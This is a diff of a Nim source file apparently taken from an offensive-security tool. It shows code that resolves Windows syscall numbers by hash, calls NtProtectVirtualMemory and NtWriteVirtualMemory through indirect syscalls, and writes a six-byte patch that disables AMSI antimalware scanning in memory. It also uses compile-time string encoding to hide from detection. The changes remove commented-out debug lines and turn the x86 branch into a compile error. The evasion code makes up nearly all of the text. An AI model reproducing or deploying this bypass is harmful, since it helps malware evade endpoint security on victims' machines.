@@ -1,12 +1,11 @@
 include custom
 import strutils
 import os
-import strformat
 import std/dynlib
 import ptr_math
 
+# encode strings at compile time
 import strenc
-# TODO: implement own version of strenc
 
 {.passC:"-masm=intel".}
 
@@ -149,22 +148,16 @@ proc NtProtectVirtualMemory(ProcessHandle: Handle, BaseAddress: var PVOID, Numbe
     asm """
         mov r10, rcx
         mov eax, `ntProtectSyscall`
-        mov r11, `syscallJumpAddress` #0xF87F0000898D6D4F # 0x00007FF84F6D8D89 # `syscallJumpAddress`
+        mov r11, `syscallJumpAddress`
         jmp r11
         ret
     """
 
 proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: var PVOID, Buffer: PVOID, NumberOfBytesToWrite: ULONG, NumberOfBytesWritten: PULONG): NTSTATUS {.asmNoStackFrame.} =
-    #asm """
-    #    mov r10, rcx
-    #    mov eax, `ntWriteSyscall`
-    #    syscall
-    #    ret
-    #"""
     asm """
         mov r10, rcx
         mov eax, `ntWriteSyscall`
-        mov r11, `syscallJumpAddress`# 0xF87F0000898D6D4F # 0x00007FF84F6D8D89 # 
+        mov r11, `syscallJumpAddress`
         jmp r11
         ret
     """
@@ -178,23 +171,15 @@ when isMainModule:
         ntWrite: HG_TABLE_ENTRY = HG_TABLE_ENTRY(dwHash: writeHash)
 
     if getSyscall(ntProtect) and getSyscall(ntWrite):
-        #echo fmt"[+] NtProtectVirtualMemory"
-        #echo fmt"    Opcode  : {toHex(example.wSyscall)}"
-        #echo fmt"    Address : 0x{toHex(cast[ByteAddress](example.pAddress))}"
-        #echo fmt"    Hash    : {toHex(example.dwHash)}"
-
         ntProtectSyscall = ntProtect.wSysCall
         ntWriteSyscall = ntWrite.wSysCall
 
         # https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim
         when defined amd64:
             echo "[*] Running in x64 process"
-            # TODO: xor encrypt patch and decrypt on patching
             const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
         elif defined i386:
-            #echo "[*] Running in x86 process"
-            #const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
-            echo "[!] x86 not supported!"
+            {.error: "[!] x86 not supported!" }
 
         var
             amsi: LibHandle
